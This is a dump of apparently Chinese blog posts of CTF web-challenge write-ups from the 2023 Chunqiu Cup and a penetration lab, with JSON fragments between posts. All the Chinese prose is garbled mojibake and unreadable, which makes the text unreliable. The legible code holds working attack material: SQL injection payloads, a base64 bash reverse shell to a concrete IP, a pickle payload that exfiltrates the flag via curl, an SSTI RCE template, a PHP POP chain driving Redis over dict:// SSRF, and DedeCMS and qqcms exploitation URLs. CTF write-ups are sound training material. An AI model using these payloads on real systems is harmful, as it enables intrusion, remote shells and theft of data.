ç›´æ¥æ‹¿åˆ°flag Web5 æ‰“å¼€ç½‘ç«™ç›´æ¥dirsearchæ‰«ç›®å½•ï¼Œæ‰¾åˆ°adminçš„ç™»å½•é¡µé¢ é¦–é¡µæ˜¯åå°ç™»å½•é¡µé¢ï¼Œä¿¡æ¯æœç´¢æ— æœï¼Œæ¥ç€å°è¯•sqlæ³¨å…¥ï¼ŒbpæŠ“åŒ… å¦‚ä¸Šå›¾ï¼Œè¾“å…¥ä¸æ­£ç¡®çš„ç”¨æˆ·åï¼Œä¼šå›æ˜¾ä¸å­˜åœ¨ï¼Œæ‰€ä»¥éœ€è¦æ‰¾åˆ°æ­£ç¡®ç”¨æˆ·åï¼Œå°è¯•ç›´æ¥å¯¹è¿™useræˆ–passwordå‚æ•°è¿›è¡Œsqlæ³¨å…¥ å¾ˆå¹¸è¿å‘ç°æ•°æ®åº“å­˜åœ¨sqlæ³¨å…¥ï¼Œä¸”ä¼šå›æ˜¾æŠ¥é”™ä¿¡æ¯ï¼Œé‚£å°±å°è¯•æŠ¥é”™æ³¨å…¥ï¼ˆè¿™é‡Œæ‰‹å·¥fuzzæˆ–è€…ç½‘ä¸Šæ–‡ç« ï¼Œå¯ä»¥æ‰¾åˆ°è¯¥ç½‘ç«™è¿‡æ»¤çš„sqlæ³¨å…¥å…³é”®å­—ï¼‰ä½†åŒå†™å³å¯ç»•è¿‡ 1'or updatexml(1,concat(0x7e,(database()),0x7e),1)%23 çˆ†å‡ºæ•°æ®åº“åï¼Œç»§ç»­æ‰§è¡Œå³å¯ï¼Œä¸è¿‡è¿™é‡Œç›´æ¥æ˜¾ç¤ºäº†å­—æ®µåï¼Œæˆ‘ä»¬é’ˆå¯¹çš„æŸ¥æ‰¾usernameå’Œpasswordå³å¯ 1'or updatexml(1,concat(0x7e,(seleselectct group_concat(table_name) fr from om information_schema.tables whe where re table_schema like 'beescms'),0x7e),1)%23 æ¥ç€å°±èƒ½çˆ†ç ´ç”¨æˆ·åå’Œå¯†ç äº† 1'or updatexml(1,concat(0x7e,(seleselectct admin_name fr from om bees_admin),0x7e),1)%23 1'or updatexml(1,concat(0x7e,(seleselectct admin_password fr from om bees_admin),0x7e),1)%23 ç”¨æˆ·åä¸ºmeetsecï¼Œå¯†ç å›æ˜¾ä¸å…¨ï¼Œsubstringå¤„ç†ä¸€ä¸‹å°±è¡Œï¼Œè¿™é‡Œä¸å†™äº†ï¼Œæœ€åæ˜¯ç¼ºå°‘ä¸ªå­—æ¯bï¼Œä¸Šmd5ç ´è§£ç½‘ç«™çˆ†ç ´å¾—åˆ°å¯†ç ä¸ºLogin123 2446d54c2e68d221db9cff653b01a0eb ç™»é™†ä¹‹åæ‰¾åˆ°æ–‡ä»¶ä¸Šä¼ é¡µé¢upload.php æµ‹è¯•äº†ä¸€ä¸‹å‘ç°åªæ˜¯æ£€æµ‹mimeå†…å®¹ï¼Œä¿®æ”¹ä¸€ä¸‹å³å¯ ç‚¹å‡»å›¾ç‰‡åˆ—è¡¨å¯ä»¥æ‰¾åˆ°ä¸Šä¼ çš„å›¾ç‰‡è·¯å¾„ï¼Œä¿®æ”¹å¯¹åº”æ–‡ä»¶åå³å¯ï¼Œä¹‹åè®¿é—®ç›´æ¥getshellï¼Œæ²¡æœ‰è¿‡æ»¤ï¼Œå¦‚ä¸‹å›¾å¾—åˆ°flag Web6 è¿™é‡Œç»å…¸tomcatä¸­é—´ä»¶ï¼Œé«˜ç‰ˆæœ¬ä»¥åŠæ‰«ç›®å½•å‘ç°manageå­˜åœ¨ï¼Œç›´æ¥è®¿é—®å‘ç°æ˜¯ä¸€ä¸ªhttpèº«ä»½è®¤è¯ï¼ŒæŠ“åŒ…çˆ†ç ´å¼±å£ä»¤ æˆåŠŸçˆ†ç ´ï¼štomcat:qwe123 è¿™é‡Œä¹‹å‰çˆ†ç ´äº†né•¿æ—¶é—´æ— æœï¼Œæå¾—ä»¥ä¸ºåˆæ˜¯ä»€ä¹ˆå…¶ä»–æ¼æ´ï¼Œç»“æœæ˜¯å­—å…¸é—®é¢˜ è¿›å…¥åå°å°±æ˜¯å¸¸è§„ä¸Šä¼ waråŒ…äº†ï¼Œè¿™é‡Œå°è¯•äº†å¤šä¸ªjspé©¬ï¼Œä½†æœ€åéƒ½è¿ä¸ä¸Šå»ï¼Œä¹Ÿä¸çŸ¥é“ä¸ºå•¥ï¼Œæ„Ÿè§‰æ˜¯æœ¨é©¬é—®é¢˜ ä¹‹ååªèƒ½å°è¯•msfvenomç”Ÿæˆä¸€ä¸ªåå¼¹shellçš„jspé©¬ï¼Œæœ€ç»ˆéƒ¨ç½²åè®¿é—®ï¼Œå¾—åˆ°shell Web7 çœ‹ç«¯å£å’Œé¡µé¢å›æ˜¾å°±çŸ¥é“äº†ï¼Œè¿™é‡Œå­˜åœ¨redisæœªæˆæƒï¼Œå°è¯•ç›´æ¥redis-cliè¿æ¥ å‘ç°åªèƒ½ä½¿ç”¨å‡ ä¸ªè¯»å–å‘½ä»¤ï¼Œæ²¡æœ‰å†™çš„æƒé™ï¼Œä¹Ÿå°±æ˜¯æ™®é€šç”¨æˆ·æƒé™ï¼Œé‚£å¯ä»¥æƒ³åˆ°åˆ©ç”¨redisä¸»ä»å¤åˆ¶ç›´æ¥æ‹¿shell åˆ©ç”¨å·¥å…·https://github.com/n0b0dyCN/redis-rogue-server/ï¼Œåœ¨vpsèµ·ä¸€ä¸ªæ¶æ„redisæœåŠ¡ï¼Œè®©é¶æœºæˆä¸ºæˆ‘ä»¬çš„ä»æœåŠ¡å™¨ï¼Œç›´æ¥é å…¨é‡å¤åˆ¶ä¸Šä¼ exp.soï¼ŒæˆåŠŸæ‹¿shell è¿™é‡Œåšå®Œæ²¡æœ‰æˆªå›¾ï¼Œç»“æœé‡æ–°åšçš„æ—¶å€™ç¯å¢ƒéƒ½å‡ºé—®é¢˜äº†ï¼Œä½¿ç”¨å¤‡ç”¨é¶æœºå‘ç°ä¼¼ä¹ç›®æ ‡æœºé…ç½®æœ‰é—®é¢˜ï¼Ÿç›¸åŒå‘½ä»¤åœ¨è¿™é‡Œç”¨ä¸äº†äº† è¿™é‡Œç›´æ¥cat /flagæ˜¯å¯ä»¥æ‹¿åˆ°çš„ Web9 è¿™é“é¢˜å¾ˆå¹¸è¿ï¼Œåœ¨ç¬¬ä¸€å°ä¸»æœºè®¿é—®çš„æ—¶å€™ï¼Œé¡µé¢å›æ˜¾404ï¼Œä¹Ÿå°±çŸ¥é“æ˜¯ä¸ªJavaæ¡†æ¶ï¼Œä½†ä¸çŸ¥é“å’‹åˆ©ç”¨ï¼Œè€—äº†ä¸€å¤©æ²¡æ€è·¯ï¼Œç¬¬äºŒå¤©ç»§ç»­æ‰«ç›®å½•ï¼Œä¾æ—§æ— æœï¼Œä½†æ˜¯åœ¨å›å¤´åšWeb2çš„æ—¶å€™ï¼Œåœ¨æ‹¿ä¸‹ç¬¬ä¸€å°ä¸»æœºshellä¹‹åï¼Œå°è¯•ç”¨fscanæ‰«äº†ä¸€ä¸‹å†…ç½‘ä¸»æœºæ¼æ´ã€‚ ç»“æœå°±å‡ºWeb9è¿™ä¸ªä¸»æœºå­˜åœ¨nacosçš„å¼±å£ä»¤ï¼Œç®€ç›´ç¥äº†ï¼Œæ¥ç€å°±æ˜¯ç™»å½•ï¼Œä½†è¿™æ—¶å€™åˆæ²¡æœ‰æ€è·¯äº†ï¼Œå°è¯•äº†ç½‘ä¸Šçš„å‡ ä¸ªå·¥å…·ï¼Œä½†æ˜¯ä¸å­˜åœ¨ç›¸å…³çš„ååºåˆ—åŒ–æ¼æ´ï¼Œä¹‹åæ— æ„é—´æŸ¥çœ‹äº†é…ç½®è¯¦æƒ…ï¼Œç»“æœçœ‹åˆ°äº†shiro keyçš„æ³„éœ²ï¼Œè¿™ä¸‹æ€è·¯æœ‰äº† ç›´æ¥å·¥å…·æ¢­å“ˆäº†ï¼Œå¦‚ä¸‹å›¾ï¼Œçˆ†ç ´å‡ºåˆ©ç”¨é“¾ï¼Œç›´æ¥å‘½ä»¤æ‰§è¡Œå¾—åˆ°flag æ€»ç»“ ç›®å‰ç»éªŒå¤ªå°‘äº†ï¼Œå¹³å¸¸æ²¡æœ‰å¤šå®è·µï¼Œå› æ­¤é‡åˆ°è¿™æ¬¡æ¸—é€é¶åœºçš„é¢˜ï¼Œæ€è·¯å‡ ä¹è·Ÿç€ç½‘ä¸Šæ–‡ç« éƒ½æ˜¯ç¢°å‡ºæ¥çš„ï¼Œè¿™æç¤ºç€æˆ‘ä»Šåè¿˜éœ€è¦å¤šå®è·µä¸€ä¸‹ã€‚ åœ¨ä¸Šé¢çš„web2å†…ç½‘ä¸­ï¼Œå°±ç”±äºè‡ªå·±å†…ç½‘çŸ¥è¯†çš„æ¬ ç¼ºï¼Œå§‹ç»ˆä¸çŸ¥é“å¦‚ä½•å®Œç¾çš„ä¸‹æ‰‹ï¼Œå†…ç½‘éš§é“æ­ä¸èµ·æ¥ï¼Œå¯¼è‡´æœ€ç»ˆæ— æœã€‚ web3æ˜¯ä¸€ä¸ªMySQLæ•°æ®åº“çš„æš´æ¼ï¼Œä½†æˆ‘ä¹ŸåªçŸ¥é“çˆ†ç ´ä¸€ä¸‹å¯†ç ã€‚å…¶ä½™ä¹Ÿæ²¡æœ‰ä»€ä¹ˆæ€è·¯äº†ã€‚ã€‚ã€‚ã€‚ å‚è€ƒæ–‡ç«  WebLogic XMLDecoderååºåˆ—åŒ–æ¼æ´(CVE-2017-10271)æ¼æ´å¤ç° Spring Boot Actuator æœªæˆæƒçš„æµ‹è¯•ä¸åˆ©ç”¨æ€è·¯ å¯¹äºSpring Bootçš„æ¸—é€å§¿åŠ¿ Springbootä¹‹Actuatorä¿¡æ¯æ³„éœ²æ¼æ´åˆ©ç”¨ beescmsä»£ç å®¡è®¡"},{"title":"iæ˜¥ç§‹CTFåˆ·é¢˜","path":"/2024/03/29/i-chun-qiu-shua-ti-ji-lu/","content":"2023å¹´æ˜¥ç§‹æ¯ç½‘ç»œå®‰å…¨è”èµ›æ˜¥å­£èµ› picup å…ˆdirsearchæ‰«ç›®å½•ï¼Œå‘ç°login.phpå’Œregister.php æ¥ç€æ³¨å†Œç™»å½•ä¸€ä¸ªç”¨æˆ·å³å¯ï¼Œä¼šçœ‹åˆ°ä¸Šä¼ é¡µé¢ï¼Œè¿™é‡Œä¹Ÿæ˜¯å°è¯•äº†å¤šæ¬¡æ‰ä¸Šä¼ æˆåŠŸï¼Œä¸Šä¼ æˆåŠŸä¹‹åä¼šæ˜¾ç¤ºä¸€ä¸ªä¸Šä¼ è·¯å¾„ä»¥åŠpic.phpçš„ä¸œè¥¿ï¼ŒçŒœæµ‹è¿™é‡Œå°±æ˜¯ç»™picä¼ å‚ï¼Œèƒ½å¤Ÿç›®å½•éå†ä¹‹ç±»çš„ è¿™é‡Œè·Ÿç€wpå‘ç°å­˜åœ¨ç›®å½•éå†ï¼Œä¸è¿‡è¿‡æ»¤äº†â€¦/ï¼Œä½†åŒå†™å³å¯ç»•è¿‡ï¼ˆè¿™é‡Œä¹Ÿæ˜¯æœäº†ï¼Œä¸€ä¸ªphpçš„ç«™ï¼Œç»“æœæ˜¯pythonçš„æ´ï¼‰ æ¥ä¸‹æ¥æŸ¥çœ‹pythonæºç  import os import pickle import base64 import hashlib from flask import Flask,request,session,render_template,redirect from Users import Users from waf import waf users=Users() app=Flask(__name__) app.template_folder=\"./\" app.secret_key=users.passwords['admin']=hashlib.md5(os.urandom(32)).hexdigest() @app.route('/',methods=['GET','POST']) @app.route('/index.php',methods=['GET','POST']) def index(): if not session or not session.get('username'): return redirect(\"login.php\") if request.method==\"POST\" and 'file' in request.files and (filename:=waf(request.files['file'])): filepath=os.path.join(\"./uploads\",filename) request.files['file'].save(filepath) return \"File upload success! Path: &lt;a href='pic.php?pic=\"+filename+\"'&gt;\"+filepath+\"&lt;/a&gt;.\" return render_template(\"index.html\") @app.route('/login.php',methods=['GET','POST']) def login(): if request.method==\"POST\" and (username:=request.form.get('username')) and (password:=request.form.get('password')): if type(username)==str and type(password)==str and users.login(username,password): session['username']=username return \"Login success! &lt;a href='/'&gt;Click here to redirect.&lt;/a&gt;\" else: return \"Login fail!\" return render_template(\"login.html\") @app.route('/register.php',methods=['GET','POST']) def register(): if request.method==\"POST\" and (username:=request.form.get('username')) and (password:=request.form.get('password')): if type(username)==str and type(password)==str and not username.isnumeric() and users.register(username,password): return \"Register successs! Your username is {username} with hash: {{users.passwords[{username}]}}.\".format(username=username).format(users=users) else: return \"Register fail!\" return render_template(\"register.html\") @app.route('/pic.php',methods=['GET','POST']) def pic(): if not session or not session.get('username'): return redirect(\"login.php\") if (pic:=request.args.get('pic')) and os.path.isfile(filepath:=\"./uploads/\"+pic.replace(\"../\",\"\")): if session.get('username')==\"admin\": return pickle.load(open(filepath,\"rb\")) else: return '''&lt;img src=\"data:image/png;base64,'''+base64.b64encode(open(filepath,\"rb\").read()).decode()+'''\"&gt;''' res=\"&lt;h1&gt;files in ./uploads/&lt;/h1&gt;&lt;br&gt;\" for f in os.listdir(\"./uploads\"): res+=\"&lt;a href='pic.php?pic=\"+f+\"'&gt;./uploads/\"+f+\"&lt;/a&gt;&lt;br&gt;\" return res if __name__ == '__main__': app.run(host='0.0.0.0', port=80) è¿™é‡Œä¸»è¦çœ‹picå‡½æ•°çš„å¤„ç†å°±è¡Œï¼Œè¯´æ˜¯å¦‚æœå­˜åœ¨picå‚æ•°ï¼Œä¸”picå‚æ•°ä¸uploadsæ‹¼æ¥ä¹‹åçš„æ–‡ä»¶å­˜åœ¨ï¼Œåˆ™è¿›å…¥ä¸‹ä¸€ä¸ªifè¯­å¥ï¼Œç»§ç»­åˆ¤æ–­å¦‚æœsessioné‡Œé¢çš„usernameå€¼ä¸ºadminï¼Œå°±ä¼šè°ƒç”¨pickle.loadå°†æ–‡ä»¶å†…å®¹ååºåˆ—åŒ–å‡ºæ¥ï¼Œè¿›è€Œå±•ç¤ºã€‚ å¾ˆæ˜æ˜¾å°±æ˜¯pickleçš„ååºåˆ—åŒ–æ¼æ´äº†ï¼Œæ¥ä¸‹æ¥çœ‹å¦‚ä½•ä¼ªé€ adminçš„session è¿™é‡Œä¹Ÿæ˜¯çœ‹äº†wpæ‰çŸ¥é“å¦‚ä½•ä¼ªé€ çš„ï¼Œè¿™é‡Œç”¨çš„æ˜¯formatçš„æ ¼å¼åŒ–æ¼æ´ï¼Œè¿™ä¸ªæ¼æ´å¯å‚è€ƒpç¥ï¼šPython æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆDjangoä¸ºä¾‹ï¼‰ å¦‚ä¸Šå›¾ï¼Œæ‹¿åˆ°äº†adminçš„passwordï¼Œåˆ©ç”¨ä»–æ¥ä¼ªé€ sessionï¼ˆå› ä¸ºä¸Šè¿°sessionçš„keyå°±æ˜¯adminçš„å¯†ç ï¼‰ 3720c7094d15e3d181c48d5199bcdde9 eyJ1c2VybmFtZSI6ImFkbWluIn0.ZhEK1Q.8tM16cciuq2JtEt9gXj6Uj-olHg è¿™é‡Œçœ‹wpç›´æ¥ä¸Šä¼ çš„æ¨¡æ¿å»RCEï¼ˆpocæ–‡ä»¶ï¼‰ {{lipsum['__glob''als__']['__built''ins__']['ev''al'](request.data)}} æ¥ç€ä¸Šä¼ expæ–‡ä»¶ï¼Œä¹‹ååˆ©ç”¨pickleè§¦å‘æ‰§è¡Œ import pickle from flask import render_template class EXP(): def __reduce__(self): return(render_template,(\"uploads/poc\",)) exp=EXP() f=open(\"exp\",\"wb\") pickle.dump(exp,f) bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}' ç”±äºflagæ²¡æœ‰è¯»å–æƒé™ï¼Œä½†clear.shå¯è¯»å¯å†™ï¼Œä¸”æ¯ååˆ†é’Ÿä¼šæ‰§è¡Œï¼Œå†™å…¥echo cat /flag&gt;1.txtå³å¯ å‚è€ƒæ–‡ç«  2023å¹´æ˜¥ç§‹æ¯ç½‘ç»œå®‰å…¨è”èµ›å†¬å­£èµ› 2023å¹´æ˜¥ç§‹æ¯ç½‘ç»œå®‰å…¨è”èµ›å†¬å­£èµ› Writeup ezezez_php &lt;?php highlight_file(__FILE__); include \"function.php\"; class Rd { public $ending; public $cl; public $poc; public function __destruct() { echo \"All matters have concluded\".\"&lt;/br&gt;\"; } public function __call($name, $arg) { foreach ($arg as $key =&gt; $value) { if ($arg[0]['POC'] == \"0.o\") { $this-&gt;cl-&gt;var1 = \"get\"; } } } } class Poc { public $payload; public $fun; public function __set($name, $value) { $this-&gt;payload = $name; $this-&gt;fun = $value; } function getflag($paylaod) { echo \"Have you genuinely accomplished what you set out to do?\".\"&lt;/br&gt;\"; file_get_contents($paylaod); } } class Er { public $symbol; public $Flag; public function __construct() { $this-&gt;symbol = True; } public function __set($name, $value) { if (preg_match('/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/',base64_decode($this-&gt;Flag))){ $value($this-&gt;Flag); } else { echo \"NoNoNo,please you can look hint.php\".\"&lt;/br&gt;\"; } } } class Ha { public $start; public $start1; public $start2; public function __construct() { echo $this-&gt;start1 . \"__construct\" . \"&lt;/br&gt;\"; } public function __destruct() { if ($this-&gt;start2 === \"o.0\") { $this-&gt;start1-&gt;Love($this-&gt;start); echo \"You are Good!\".\"&lt;/br&gt;\"; } } } function get($url) { $url=base64_decode($url); var_dump($url); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); $output = curl_exec($ch); $result_info = curl_getinfo($ch); var_dump($result_info); curl_close($ch); var_dump($output); } if (isset($_POST['pop'])) { $a = unserialize($_POST['pop']); } else { die(\"You are Silly goose!\"); } ?&gt; popé“¾å­å¦‚ä¸‹ &lt;?php class Rd { public $ending; public $cl; public $poc; } class Poc { public $payload; public $fun; } class Er { public $symbol; public $Flag; } class Ha { public $start; public $start1; public $start2; } //ä¾æ¬¡å†™å…¥å³å¯ /* dict://127.0.0.1:6379/flushall dict://127.0.0.1:6379/config set dir /tmp dict://127.0.0.1:6379/config set dbfilename exp.so dict://127.0.0.1:6379/slaveof ip port dict://127.0.0.1:6379/system.exec env */ $payload = \"dict://127.0.0.1:6379/system.exec env\"; $pop = new Ha(); $pop-&gt;start = ['POC'=&gt;'0.o']; $pop-&gt;start1 = new Rd(); $pop-&gt;start2 = \"o.0\"; $pop-&gt;start1-&gt;cl = new Er(); $pop-&gt;start1-&gt;cl-&gt;Flag = base64_encode($payload); echo serialize($pop); ?&gt; Active-Takeaway Javaé¢˜ç›®ï¼Œç›®å‰ä¸ä¼šï¼Œçœ‹äº†çœ‹ä¼¼ä¹å¾ˆéš¾ï¼Œä¸”æ²¡å­¦è¿‡ è¯´æ˜¯å¯ä»¥å‚è€ƒï¼šhttps://www.yulegeyu.com/ ezdede è·å¾—æç¤ºå¼±å¯†ç ä¸ºï¼šadmin@123ã€‚éšåadminç”¨æˆ·ç™»å½•åå° å‚è€ƒï¼š[DedeCMS V5.7 SP2åå°å­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´](http://www.xcxan.cn/archives/240)â€“è¿›è¡Œå¤ç°å³å¯ dede/tpl.php?filename=aahybcx.lib.php&amp;action=savetagfile&amp;content=&lt;?=`cat /flag`;?&gt;&amp;token=f32f26ac2fb800623e06fa0c3d9155ef è¿™é‡Œç”¨ä¸ªçŸ­æ ‡ç­¾ç»•è¿‡å³å¯ å‚è€ƒæ–‡ç«  æ˜¥ç§‹æ¯å†¬å­£èµ› 2023 Writeup 2023å¹´æ˜¥ç§‹æ¯ç½‘ç»œå®‰å…¨è”èµ›æ˜¥å­£èµ› phpstudy åˆšå¼€å§‹ä¹Ÿæ˜¯æ‡µé€¼ï¼Œ404é¡µé¢ï¼Œçœ‹äº†ç­”æ¡ˆå‘ç°ï¼Œè¿™é‡Œè€ƒå¯Ÿçš„æ˜¯ä¸ªAjaxè¯·æ±‚ï¼Œæˆ‘ä»¬éœ€è¦æ·»åŠ å¦‚ä¸‹ X-Requested-Withï¼šXMLHttpRequest ä¹‹åæ‰èƒ½çœ‹åˆ°æ­£å¸¸é¡µé¢ï¼Œä¹‹åä¾æ—§æ˜¯çœ‹çš„ç­”æ¡ˆï¼ˆè¯´æ˜¯ä¸ª1dayï¼‰ è·Ÿç€å¤ç°ï¼Œé¦–å…ˆå‰ç«¯å­˜åœ¨updateæ³¨å…¥ï¼ˆçœŸä¸çŸ¥é“æ¯”èµ›çš„æ—¶å€™å¦‚ä½•æ‰ä¼šæƒ³åˆ°ï¼Œå”‰ï¼‰ admin';update admins set password='c26be8aaf53b15054896983b43eb6a65';-- å¿½ç•¥æŠ¥é”™ï¼Œä¹‹åç™»å½•å³å¯ï¼Œå¦‚æœç™»å½•è¿‡åè¿˜æ˜¯404ï¼Œç»§ç»­éšæœºéªŒè¯ç ç»•è¿‡ï¼Œè¿™é‡Œè¿˜å¯ä»¥å‘ç°ä¾æ—§å­˜åœ¨xssæ¼æ´ æ¥ä¸‹æ¥æ·»åŠ è®¡åˆ’ä»»åŠ¡RCEå³å¯ï¼Œè¿™é‡Œæˆ‘åå¼¹shell æˆåŠŸæ‹¿åˆ°shellï¼Œå›é¡¾ä¸€ä¸‹è¿˜æ˜¯éš¾ä»¥ç†è§£ï¼Œæˆ‘ä¸çŸ¥é“å“ªé‡Œèƒ½å¾—çŸ¥è¯¥ç³»ç»Ÿç‰ˆæœ¬ï¼Œå¤§ä½¬æ€è·¯æƒ³è±¡ä¸åˆ° å‚è€ƒæ–‡ç«  phpstudyå°çš®é¢æ¿2023ç‰ˆRCE easypy æ‰«ç›®å½•å‘ç°downloadï¼Œä¸‹è½½æºç å‘ç°app.pyå•¥ä¹Ÿæ²¡æœ‰ï¼Œä¹‹åçœ‹åˆ°å¦ä¸€ä¸ªç›®å½•å­˜åœ¨appçš„ç¼–è¯‘æ–‡ä»¶pycï¼Œå°è¯•åç¼–è¯‘å¾—åˆ°æºç  pip3å®‰è£…uncompyleå³å¯ # uncompyle6 version 3.9.1 # Python bytecode version base 3.8.0 (3413) # Decompiled from: Python 3.8.6 (tags/v3.8.6:db45529, Sep 23 2020, 15:52:53) [MSC v.1927 64 bit (AMD64)] # Embedded file name: app.py # Compiled at: 2023-04-16 23:41:59 # Size of source mod 2**32: 1030 bytes import numpy, base64 from flask import Flask, Response, request app = Flask(__name__) @app.route(\"/\", methods=[\"GET\", \"POST\"]) def index(): return \"å°pæƒ³è¦æ‰¾ä¸€ä¸ªå¥³æœ‹å‹ï¼Œä½ èƒ½å¸®ä»–æ‰¾æ‰¾çœ‹ä¹ˆï¼Ÿ\" @app.route(\"/girlfriends\", methods=[\"GET\", \"POST\"]) def girlfriends(): if request.values.get(\"data\"): data = request.values.get(\"data\") numpydata = base64.b64decode(data) if b'R' in numpydata or b'bash' in numpydata or b'sh' in numpydata: return \"ä¸èƒ½èµ°æ·å¾„å•Š\" resp = numpy.loads(numpydata) return \"å¯ä»¥çš„ï¼Œè¦çš„å°±æ˜¯ä¸€ç§æ„Ÿè§‰\" return \"æœ‰è¿›æ­¥äº†,ä½†æ˜¯ä¸å¤š\" @app.route(\"/download\", methods=[\"GET\", \"POST\"]) def download(): with open(\"www.zip\", \"rb\") as f: stream = f.read() response = Response(stream, content_type=\"application/octet-stream\") response.headers[\"Content-disposition\"] = \"attachment;filename=www.zip\" return response if __name__ == \"__main__\": app.run(host=\"0.0.0.0\", port=80) ä¸€çœ¼çœ‹åˆ°/girlfriendsè·¯ç”±ä¸‹çš„loadsï¼Œæƒ³åˆ°pickleååºåŒ–ï¼Œçœ‹åˆ°è¿™é‡Œè¿‡æ»¤äº†RæŒ‡ä»¤ï¼Œbashä»¥åŠshå­—ç¬¦ï¼Œçœ‹äº†wpå¯ä»¥ç”¨curlå¤–å¸¦å‡ºæ¥ import base64 opcode=b'''(S'curl ip:8888/`cat /f*`' ios system ''' print(base64.b64encode(opcode)) å‚è€ƒæ–‡ç«  2023å¹´æ˜¥ç§‹æ¯ç½‘ç»œå®‰å…¨è”èµ› æ˜¥å­£èµ› wp call ä¸ä¼šï¼Œä¹Ÿæ²¡wp-.- php_again PHP OPcache getshell è¿™ä¸ªçŸ¥è¯†ç‚¹çš„å­¦ä¹ ï¼Œå¦èµ·ä¸€ç¯‡æ–‡ç« äº†ï¼Œæœ‰ç‚¹é•¿ã€‚ å‘ç°çŸ¥è¯†ç‚¹çœŸçš„å¤šï¼Œæ‹¿ä¸ä¸‹ã€‚ã€‚ã€‚ã€‚ ezrust use actix_files::NamedFile; use actix_web::{App, HttpRequest, HttpResponse, HttpServer, Responder, Result, web, get, post, guard}; use std::path::PathBuf; async fn index(req: HttpRequest) -&gt; Result&lt;NamedFile&gt; { let mut path: PathBuf = req.match_info().query(\"filename\").parse().unwrap(); if path.to_str().expect(\"REASON\").to_string().contains(\"p\") { path = PathBuf::from(\"no\"); } Ok(NamedFile::open(path)?) } #[get(\"/\")] async fn hello() -&gt; impl Responder { HttpResponse::Ok().body(\"Hello world!\") } #[get(\"/{name}\")] async fn name(path: web::Path&lt;(String)&gt;) -&gt; Result&lt;String&gt; { let name = path.into_inner(); Ok(format!(\"Welcome {}!\", name)) } #[actix_web::main] async fn main() -&gt; std::io::Result&lt;()&gt; { HttpServer::new(|| { App::new() .service(hello) .service(name) .route(\"/{filename:.*}\", web::get().to(index)) }) .bind((\"0.0.0.0\", 8000))? .run() .await } è¿™é‡Œä¸å¤ªç†è§£ï¼Œä»£ç è¯´æ˜¯indexå‡½æ•°ä¸‹ï¼Œä¼šå¤„ç†filenameå‚æ•°å†…å®¹ï¼Œå¦‚æœå‡ºç°påˆ™ç½®ç©ºï¼Œè¿™é‡Œæ˜¯å¯ä»¥ç›®å½•ç©¿è¶Šçš„ï¼Œé¢˜ç›®ä¹Ÿæç¤ºåœ¨workç›®å½•ä¸‹ã€‚æ„Ÿè§‰åƒæ˜¯æ–‡å­—æ¸¸æˆï¼Œè¿™é‡Œè¯»å–å½“å‰ç›®å½•å°±ä¼šå‘ç°å­˜åœ¨flagï¼Œéš¾é“workæ„å‘³ç€å·¥ä½œç›®å½•ï¼Œè€Œä¸æ˜¯workç›®å½•ï¼Ÿ qqcms è¿™é“é¢˜è€ƒå¯Ÿä»£ç å®¡è®¡ï¼Œç”±äºæ²¡å­¦è¿‡ï¼Œå³ä½¿èƒ½çœ‹æ‡‚PHPä»£ç æ„Ÿè§‰ä¹Ÿæ˜¯æ— ä»ä¸‹æ‰‹ï¼Œå› æ­¤å°±ç›´æ¥è·Ÿç€wpçœ‹æ¼æ´ç‚¹ï¼Œç­‰ä¸‹å‘¨å­¦äº†ä¸€æ­¥æ­¥è¿›é˜¶å§ã€‚ æ ‡ç­¾å†…sqlæ³¨å…¥ ä¸‡èƒ½æ ‡ç­¾ï¼šåˆ—è¡¨å½¢å¼è°ƒç”¨æ•°æ®åº“é‡Œä»»ä½•æ•°æ® {{loop sql='select * from qc_user'}} å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„æœç´¢æ¡†å­˜åœ¨sqlæ³¨å…¥ï¼Œå®šä½åˆ°æºç å°±æ˜¯è¿™ä¸ªä½ç½® è·Ÿè¿›tempRun è¿™é‡Œæ ¹æ®wpï¼šè·Ÿè¿›tempRunï¼Œå‘ç°å¯¹é¡µé¢è§£æäº†æ‰€æœ‰çš„æ ‡ç­¾ ç»§ç»­è·Ÿè¿›loop_Tmpï¼Œçœ‹åˆ°å¯¹é¡µé¢è¿›è¡Œäº†æ­£åˆ™åŒ¹é…ï¼Œæ­£å¥½æˆ‘ä»¬é€šè¿‡Searchä¼ å‚å¯ä»¥åœ¨é¡µé¢å†™å…¥æ ‡ç­¾ï¼ˆèµ‹ä¸ªç…§ç‰‡ï¼‰ æ‰§è¡Œsqlè¯­å¥ï¼Œä¿®æ”¹è´¦å·å¯†ç  {{loop sql='update qc_user set Password=md5(114514),Phone=16666666666'}}test{{/loop}} è‡³äºåŸå› æˆ‘ä»¬å¯ä»¥ç»§ç»­è·Ÿè¿›replaceLoopï¼Œå¦‚ä¸‹å›¾ï¼Œå‘ç°æ‰§è¡Œäº†sqlæŸ¥è¯¢ï¼Œç»§ç»­è·Ÿè¿› çœ‹åˆ°è¿™é‡Œæ˜¯åº•å±‚é€»è¾‘ï¼Œæ‰§è¡Œäº†sqlå¯¹åº”çš„sqlè¯­å¥ã€‚ åœ¨åˆšæ‰çš„æŸ¥è¯¢æ¡†æ‰§è¡Œå³å¯ åå°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ ç™»å½•åå°åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´å³å¯ å¼•å…¥ç»„ä»¶ï¼šå¼•å…¥ä¸€äº›é€šç”¨ä»£ç é¡µé¢ï¼Œæ¯”å¦‚ä¸€ä¸ªç½‘ç«™çš„å¯¼èˆªå’Œåº•éƒ¨éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå°±å•ç‹¬åšä¸€ä¸ªç»„ä»¶ï¼Œé€šè¿‡includeæ ‡ç­¾å¼•å…¥ {{include filename='component_header.html'/}} éå†ä¸€ä¸‹å³å¯è¯»å– å®šä½åˆ°ä»£ç ï¼Œå°±æ˜¯ä¸‹å›¾ï¼Œå¯ä»¥çœ‹åˆ°å¯¹htmlæ²¡æœ‰åšå‡ºè¿‡æ»¤ å‚è€ƒæ–‡ç«  2023æ˜¥ç§‹æ¯æ˜¥å­£èµ› qqcmså¤ç° 